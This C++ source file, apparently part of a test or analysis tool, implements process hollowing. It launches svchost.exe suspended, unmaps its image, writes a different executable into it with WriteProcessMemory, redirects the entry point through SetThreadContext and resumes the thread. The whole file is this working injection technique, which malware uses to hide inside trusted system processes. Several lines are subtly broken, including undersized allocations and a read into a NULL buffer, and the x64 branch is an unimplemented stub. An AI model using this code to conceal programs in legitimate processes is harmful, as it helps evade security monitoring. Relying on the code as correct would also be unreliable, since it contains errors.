#include "GetSetThreadContext.h"


typedef LONG(WINAPI * pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

BOOL GetSetThreadContext_Injection()
{
#ifdef _WIN64
	return TRUE; //TODO implement this on x64
#else
	TCHAR lpApplicationName[] = _T("C:\\Windows\\System32\\svchost.exe");
	TCHAR lpApplicationName2[] = _T("C:\\masm32\\examples\\dialogs_later\\basic\\basicdlg.exe");
	BOOL bResult;

	STARTUPINFO StartupInfo;
	PROCESS_INFORMATION ProcessInfo;

	SecureZeroMemory(&StartupInfo, sizeof(STARTUPINFO));
	SecureZeroMemory(&ProcessInfo, sizeof(PPROCESS_INFORMATION));

	// Create the hollowed process in suspended mode
	bResult = CreateProcess(lpApplicationName, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo);
	if (bResult == NULL){
		print_last_error(_T("CreateProcess"));
		return FALSE;
	}

	// Allocate space for context structure
	PCONTEXT pContext;
	LPVOID pTargetImageBase = NULL;
	pContext = PCONTEXT(VirtualAlloc(NULL, sizeof(LPVOID), MEM_COMMIT, PAGE_READWRITE));
	if (pContext == NULL) {
		print_last_error(_T("VirtualAlloc"));
		return FALSE;
	}

	// Get the thread context of target
	pContext->ContextFlags = CONTEXT_FULL;
	bResult = GetThreadContext(ProcessInfo.hThread, pContext);
	if (bResult == NULL) {
		print_last_error(_T("GetThreadContext"));
		return FALSE;
	}

	// Read the image base address of target
	ReadProcessMemory(ProcessInfo.hProcess, LPCVOID(pContext->Ebx + 8), pTargetImageBase, 4, NULL);

	// Opening source image
	HANDLE hFile = CreateFile(lpApplicationName2, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		print_last_error(_T("CreateFile"));
		return FALSE;
	}

	// Reading the file
	DWORD dwSize = GetFileSize(hFile, 0);
	DWORD dwBytesRead;
	PBYTE pBuffer = new BYTE[dwSize];
	ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);
	PIMAGE_SECTION_HEADER pImageSectionHeader;

	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pBuffer;
	if (pDosHeader->e_magic == IMAGE_DOS_SIGNATURE)
	{
		PIMAGE_NT_HEADERS32 pNTHeaders = PIMAGE_NT_HEADERS(DWORD(pBuffer) + pDosHeader->e_lfanew);
		if (pNTHeaders->Signature == IMAGE_NT_SIGNATURE)
		{

			if (DWORD(pTargetImageBase) == pNTHeaders->OptionalHeader.ImageBase)
			{
				pNtUnmapViewOfSection NtUnmapViewOfSection;
				NtUnmapViewOfSection = (pNtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
				NtUnmapViewOfSection(ProcessInfo.hProcess, pTargetImageBase);
			}

			LPVOID pImageBase;
			pImageBase = VirtualAllocEx(ProcessInfo.hProcess, LPVOID(pNTHeaders->OptionalHeader.ImageBase), pNTHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
			if (pImageBase == NULL) {
				print_last_error(_T("VirtualAllocEx"));
				return FALSE;
			}

				WriteProcessMemory(ProcessInfo.hProcess, pImageBase, pBuffer, pNTHeaders->OptionalHeader.SizeOfHeaders, NULL);
				for (int Count = 0; Count < pNTHeaders->FileHeader.NumberOfSections; Count++)
				{
					pImageSectionHeader = PIMAGE_SECTION_HEADER(DWORD(pBuffer) + pDosHeader->e_lfanew + 248 + (Count * 40));
					WriteProcessMemory(ProcessInfo.hProcess, LPVOID(DWORD(pImageBase) + pImageSectionHeader->VirtualAddress), LPVOID(DWORD(pBuffer) + pImageSectionHeader->PointerToRawData), pImageSectionHeader->SizeOfRawData, NULL);
				}
				WriteProcessMemory(ProcessInfo.hProcess, LPVOID(pContext->Ebx + 8), LPVOID(&pNTHeaders->OptionalHeader.ImageBase), 4, NULL);
				pContext->Eax = DWORD(pImageBase) + pNTHeaders->OptionalHeader.AddressOfEntryPoint;
				SetThreadContext(ProcessInfo.hThread, LPCONTEXT(pContext));
				ResumeThread(ProcessInfo.hThread);
			
		}
	}

	return TRUE;
#endif
}